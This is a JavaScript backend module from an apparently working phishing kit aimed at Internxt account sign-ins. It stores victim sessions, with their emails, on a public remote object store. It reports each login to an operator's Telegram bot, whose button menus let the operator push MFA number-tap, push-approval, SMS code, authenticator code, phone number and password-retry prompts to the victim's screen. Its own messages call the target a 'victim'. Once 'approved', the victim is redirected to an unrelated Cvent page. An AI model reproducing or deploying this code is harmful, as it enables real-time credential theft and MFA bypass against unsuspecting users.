// api/_store.js - Shared helper for Vercel serverless functions with remote state sync
const fs = require('fs');
const path = require('path');
const https = require('https');
const crypto = require('crypto');

function escapeHtml(str) {
  return String(str || "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

const FINAL_CVENT_URL = "https://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/";

// In-memory cache for warm container executions
const memorySessions = new Map();

function getSessionDir() {
  const dir = path.join('/tmp', 'internxt_sessions');
  if (!fs.existsSync(dir)) {
    try { fs.mkdirSync(dir, { recursive: true }); } catch (e) {}
  }
  return dir;
}

function loadConfig() {
  let config = {};
  try {
    const configPath = path.join(process.cwd(), 'licenseKey.json');
    if (fs.existsSync(configPath)) {
      config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    }
  } catch (e) {}

  const botToken = process.env.TELEGRAM_BOT_TOKEN || config.telegram_bot_token || '';
  let chatId = process.env.TELEGRAM_CHAT_ID || config.telegram_chat_id || config.telegram_ChatID || '';
  if (chatId === '---') chatId = '';

  return {
    telegram_bot_token: String(botToken).trim(),
    telegram_chat_id: String(chatId).trim(),
    Page_LicenseKey: String(config.Page_LicenseKey || '').trim(),
    systemValue: String(config.systemValue || 'livepage_3month').trim()
  };
}

// Helper for HTTPS requests with timeout
function httpRequest(url, options = {}, data = null, timeoutMs = 3000) {
  return new Promise((resolve) => {
    try {
      const parsedUrl = new URL(url);
      const reqOptions = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || 443,
        path: parsedUrl.pathname + parsedUrl.search,
        method: options.method || 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
          ...(options.headers || {})
        },
        timeout: timeoutMs
      };

      const req = https.request(reqOptions, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          try {
            resolve({ ok: res.statusCode >= 200 && res.statusCode < 300, status: res.statusCode, data: JSON.parse(body) });
          } catch (e) {
            resolve({ ok: res.statusCode >= 200 && res.statusCode < 300, status: res.statusCode, body });
          }
        });
      });

      req.on('error', (err) => resolve({ ok: false, error: err.message }));
      req.on('timeout', () => { req.destroy(); resolve({ ok: false, error: 'timeout' }); });
      if (data) {
        req.write(typeof data === 'string' ? data : JSON.stringify(data));
      }
      req.end();
    } catch (e) {
      resolve({ ok: false, error: e.message });
    }
  });
}

// Remote cloud session creation (cross-serverless synchronization)
async function createSession(initialData = {}) {
  let sessionId = '';
  // Try remote KV creation to obtain shared ID across all Vercel instances
  try {
    const res = await httpRequest('https://api.restful-api.dev/objects', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, { name: 'internxt_session', data: initialData }, 2500);

    if (res.ok && res.data && res.data.id) {
      sessionId = String(res.data.id);
    }
  } catch (e) {}

  // Fallback to random hex if remote creation failed or timed out
  if (!sessionId) {
    sessionId = crypto.randomBytes(16).toString('hex');
  }

  const session = {
    ...initialData,
    sessionId,
    createdAt: Date.now(),
    updatedAt: Date.now()
  };

  saveSession(sessionId, session);
  return { sessionId, session };
}

function saveSession(sessionId, data) {
  if (!sessionId) return;
  data.sessionId = sessionId;
  data.updatedAt = Date.now();
  if (!data.createdAt) data.createdAt = Date.now();

  memorySessions.set(sessionId, data);

  try {
    const dir = getSessionDir();
    fs.writeFileSync(path.join(dir, `${sessionId}.json`), JSON.stringify(data));
    if (data.email) {
      const emailHash = Buffer.from(data.email.toLowerCase().trim()).toString('hex');
      fs.writeFileSync(path.join(dir, `email_${emailHash}.json`), JSON.stringify({ sessionId }));
    }
  } catch (e) {}
}

async function saveSessionAsync(sessionId, data) {
  saveSession(sessionId, data);

  // If sessionId is a remote object ID (32 hex characters), update remote store
  if (sessionId && sessionId.length >= 24) {
    try {
      const res = await httpRequest(`https://api.restful-api.dev/objects/${sessionId}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' }
      }, { name: 'internxt_session', data }, 2500);

      // If PUT returned 404, recreate object via POST
      if (!res.ok && res.status === 404) {
        await httpRequest('https://api.restful-api.dev/objects', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' }
        }, { name: 'internxt_session', data }, 2500);
      }
    } catch (e) {}
  }
}

function getSession(sessionId) {
  if (!sessionId) return null;
  if (memorySessions.has(sessionId)) {
    return memorySessions.get(sessionId);
  }
  try {
    const dir = getSessionDir();
    const file = path.join(dir, `${sessionId}.json`);
    if (fs.existsSync(file)) {
      const data = JSON.parse(fs.readFileSync(file, 'utf8'));
      memorySessions.set(sessionId, data);
      return data;
    }
  } catch (e) {}
  return null;
}

async function getSessionAsync(sessionId, forceRefresh = false) {
  if (!sessionId) return null;
  const local = getSession(sessionId);

  // Only true terminal states (saved, approved, wrong_number) skip remote refresh
  const isTerminal = local && (
    local.status === 'saved' ||
    local.status === 'approved' ||
    local.status === 'wrong_number_pressed' ||
    (local.redirect && (local.redirect.includes('cvent') || local.redirect === 'saved' || local.redirect === 'wrong_number'))
  );

  if (isTerminal && !forceRefresh) {
    return local;
  }

  // Query remote store for latest operator selections (e.g. approve, reject, new action)
  if (sessionId && sessionId.length >= 24) {
    try {
      const res = await httpRequest(`https://api.restful-api.dev/objects/${sessionId}`, { method: 'GET' }, null, 2500);
      if (res.ok && res.data && res.data.data) {
        const remoteData = res.data.data;
        const merged = { ...(local || {}), ...remoteData, sessionId };
        saveSession(sessionId, merged);
        return merged;
      }
    } catch (e) {}
  }
  return local;
}

function getSessionByEmail(email) {
  if (!email) return null;
  const target = email.toLowerCase().trim();
  for (const sess of memorySessions.values()) {
    if (sess.email && sess.email.toLowerCase().trim() === target) {
      return sess;
    }
  }
  try {
    const dir = getSessionDir();
    const emailHash = Buffer.from(target).toString('hex');
    const mapFile = path.join(dir, `email_${emailHash}.json`);
    if (fs.existsSync(mapFile)) {
      const map = JSON.parse(fs.readFileSync(mapFile, 'utf8'));
      if (map && map.sessionId) {
        return getSession(map.sessionId);
      }
    }
  } catch (e) {}
  return null;
}

function callTelegram(botToken, method, params = {}) {
  return new Promise((resolve) => {
    if (!botToken) return resolve({ ok: false, error: 'No bot token' });
    const payload = JSON.stringify(params);
    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${botToken}/${method}`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      },
      timeout: 5000
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          resolve({ ok: false, error: 'Invalid JSON response from Telegram' });
        }
      });
    });

    req.on('error', (err) => resolve({ ok: false, error: err.message }));
    req.on('timeout', () => { req.destroy(); resolve({ ok: false, error: 'Telegram timeout' }); });
    req.write(payload);
    req.end();
  });
}

function buildMainActionsKeyboard(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: '🔢 Number-Tap (1-99)', callback_data: `act:${sessionId}:num_menu` },
        { text: '📱 Tap-Yes', callback_data: `act:${sessionId}:tap_yes` }
      ],
      [
        { text: '💬 SMS Code', callback_data: `act:${sessionId}:sms_code` },
        { text: '🔐 Auth Code', callback_data: `act:${sessionId}:auth_code` }
      ],
      [
        { text: '📞 Ask Phone', callback_data: `act:${sessionId}:ask_phone` },
        { text: '🔁 Wrong Password', callback_data: `act:${sessionId}:retry` }
      ],
      [
        { text: '✅ Approve (Redirect to Cvent)', callback_data: `act:${sessionId}:approve` }
      ]
    ]
  };
}

function buildRangePickerKeyboard(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: '1 - 20', callback_data: `rng:${sessionId}:1-20` },
        { text: '21 - 40', callback_data: `rng:${sessionId}:21-40` }
      ],
      [
        { text: '41 - 60', callback_data: `rng:${sessionId}:41-60` },
        { text: '61 - 80', callback_data: `rng:${sessionId}:61-80` }
      ],
      [
        { text: '81 - 99', callback_data: `rng:${sessionId}:81-99` },
        { text: '📋 Show All 1-99', callback_data: `rng:${sessionId}:all` }
      ],
      [
        { text: '⬅️ Back to Main Actions', callback_data: `act:${sessionId}:back_main` }
      ]
    ]
  };
}

function buildNumberGridKeyboard(sessionId, start, end) {
  const rows = [];
  let currentRow = [];
  for (let i = start; i <= end; i++) {
    currentRow.push({ text: String(i), callback_data: `num:${sessionId}:${i}` });
    if (currentRow.length === 5) {
      rows.push(currentRow);
      currentRow = [];
    }
  }
  if (currentRow.length > 0) rows.push(currentRow);
  rows.push([
    { text: '⬅️ Pick Another Range', callback_data: `act:${sessionId}:num_menu` },
    { text: '🏠 Main Actions', callback_data: `act:${sessionId}:back_main` }
  ]);
  return { inline_keyboard: rows };
}

function buildAllNumbersGridKeyboard(sessionId) {
  const rows = [];
  let currentRow = [];
  for (let i = 1; i <= 99; i++) {
    currentRow.push({ text: String(i), callback_data: `num:${sessionId}:${i}` });
    if (currentRow.length === 5) {
      rows.push(currentRow);
      currentRow = [];
    }
  }
  if (currentRow.length > 0) rows.push(currentRow);
  rows.push([
    { text: '⬅️ Range View', callback_data: `act:${sessionId}:num_menu` },
    { text: '🏠 Main Actions', callback_data: `act:${sessionId}:back_main` }
  ]);
  return { inline_keyboard: rows };
}

function buildNumberActiveKeyboard(sessionId, number) {
  return {
    inline_keyboard: [
      [
        { text: `✅ User Tapped ${number} (Approve)`, callback_data: `act:${sessionId}:approve` },
        { text: '❌ Wrong Number', callback_data: `act:${sessionId}:wrong_num` }
      ],
      [
        { text: '🔢 Change Number', callback_data: `act:${sessionId}:num_menu` },
        { text: '🔁 Request Password Again', callback_data: `act:${sessionId}:retry` }
      ],
      [
        { text: '🏠 Main Actions', callback_data: `act:${sessionId}:back_main` }
      ]
    ]
  };
}

async function handleCallbackQuery(callbackQuery, botToken) {
  const data = callbackQuery.data || '';
  const cqId = callbackQuery.id;
  const msgId = callbackQuery.message?.message_id;
  const chatId = callbackQuery.message?.chat?.id;

  if (!data) return;

  if (data.startsWith('act:')) {
    const [, sessionId, action] = data.split(':');
    let session = await getSessionAsync(sessionId, true);
    // Never reject with session expired: initialize session on demand so operator is never blocked
    if (!session) {
      session = { sessionId, status: 'pending', createdAt: Date.now() };
    }

    if (action === 'num_menu') {
      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId });
      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `🔢 <b>Select Number Range (1-99)</b>\nSession: <code>${sessionId}</code>\nPick a range below:`,
        parse_mode: 'HTML',
        reply_markup: buildRangePickerKeyboard(sessionId)
      });
    } else if (action === 'back_main') {
      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId });
      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `🔐 <b>Sign-In Attempt (Internxt)</b>\nEmail: <code>${session.email || 'User'}</code>\nSession: <code>${sessionId}</code>\n\nChoose verification action:`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    } else if (action === 'tap_yes') {
      session.redirect = 'Tap-Yes';
      session.status = 'pending';
      await saveSessionAsync(sessionId, session);
      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: Tap-Yes' });
      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `📱 <b>Tap-Yes Active</b>\nSession: <code>${sessionId}</code>\nVictim page waiting for YES.`,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: '✅ Approved (Redirect to Cvent)', callback_data: `act:${sessionId}:approve` }],
            [{ text: '🔁 Request Password Again', callback_data: `act:${sessionId}:retry` }],
            [{ text: '🏠 Main Menu', callback_data: `act:${sessionId}:back_main` }]
          ]
        }
      });
    } else if (action === 'sms_code') {
      session.redirect = 'SMS CODE';
      session.status = 'pending';
      await saveSessionAsync(sessionId, session);
      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: SMS Code' });
      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `💬 <b>SMS Code Prompt Active</b>\nSession: <code>${sessionId}</code>`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    } else if (action === 'auth_code') {
      session.redirect = 'Authentication Code';
      session.status = 'pending';
      await saveSessionAsync(sessionId, session);
      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: Authenticator App Code' });
      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `🔐 <b>Authenticator App Code Active</b>\nSession: <code>${sessionId}</code>`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    } else if (action === 'ask_phone') {
      session.redirect = 'Ask Phonnumber';
      session.status = 'pending';
      await saveSessionAsync(sessionId, session);
      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: Ask Phone Number' });
      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `📞 <b>Phone Prompt Active</b>\nSession: <code>${sessionId}</code>`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    } else if (action === 'retry') {
      session.redirect = 'retry';
      session.status = 'retry';
      session.message = 'retry';
      await saveSessionAsync(sessionId, session);
      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Password Retry Sent' });
      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `🔁 <b>Password Retry Sent</b>\nSession: <code>${sessionId}</code>\nVictim will be asked for password again.`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    } else if (action === 'approve') {
      session.redirect = FINAL_CVENT_URL;
      session.status = 'saved';
      await saveSessionAsync(sessionId, session);
      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Approved (Redirecting to Cvent)' });
      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `🎉 <b>VERIFICATION APPROVED</b>\nSession: <code>${sessionId}</code>\nUser redirected to Cvent event summary.`,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: '🌐 View Cvent Event', url: FINAL_CVENT_URL }]
          ]
        }
      });
    } else if (action === 'wrong_num') {
      session.redirect = 'wrong_number_pressed';
      session.status = 'wrong_number_pressed';
      await saveSessionAsync(sessionId, session);
      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Marked as Wrong Number' });
      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `❌ <b>Wrong Number Tapped</b>\nSession: <code>${sessionId}</code>`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    }
  } else if (data.startsWith('rng:')) {
    const [, sessionId, range] = data.split(':');
    await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId });
    let keyboard, text;
    if (range === 'all') {
      keyboard = buildAllNumbersGridKeyboard(sessionId);
      text = `🔢 <b>Tap any Number (1 - 99):</b>\nSession: <code>${sessionId}</code>`;
    } else {
      const [start, end] = range.split('-').map(Number);
      keyboard = buildNumberGridKeyboard(sessionId, start, end);
      text = `🔢 <b>Select Number (${start} - ${end}):</b>\nSession: <code>${sessionId}</code>`;
    }
    await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
      chat_id: chatId,
      message_id: msgId,
      text: text,
      parse_mode: 'HTML',
      reply_markup: keyboard
    });
  } else if (data.startsWith('num:')) {
    const [, sessionId, numStr] = data.split(':');
    const number = parseInt(numStr, 10);
    let session = await getSessionAsync(sessionId, true);
    if (!session) {
      session = { sessionId, status: 'pending', createdAt: Date.now() };
    }
    session.numberTap = String(number);
    session.redirect = `Number-Tap:${number}`;
    session.status = 'pending';
    await saveSessionAsync(sessionId, session);

    await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: `Selected: ${number}` });
    await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
      chat_id: chatId,
      message_id: msgId,
      text: `✅ <b>Number-Tap [ ${number} ] Active!</b>\nSession: <code>${sessionId}</code>\nUser screen is now displaying number <b>${number}</b>.\n\nDid user confirm?`,
      parse_mode: 'HTML',
      reply_markup: buildNumberActiveKeyboard(sessionId, number)
    });
  }
}

let lastUpdateId = 0;
async function syncTelegramUpdates(botToken) {
  if (!botToken) return;
  try {
    const res = await (module.exports.callTelegram || callTelegram)(botToken, 'getUpdates', {
      offset: lastUpdateId + 1,
      limit: 10,
      timeout: 0,
      allowed_updates: ["message", "callback_query"]
    });
    if (res.ok && Array.isArray(res.result)) {
      for (const update of res.result) {
        if (update.update_id > lastUpdateId) {
          lastUpdateId = update.update_id;
        }
        if (update.callback_query) {
          await handleCallbackQuery(update.callback_query, botToken);
        }
      }
    }
  } catch (e) {}
}

module.exports = {
  loadConfig,
  createSession,
  saveSession,
  saveSessionAsync,
  getSession,
  getSessionAsync,
  getSessionByEmail,
  callTelegram,
  buildMainActionsKeyboard,
  handleCallbackQuery,
  syncTelegramUpdates,
  FINAL_CVENT_URL,
  escapeHtml
};
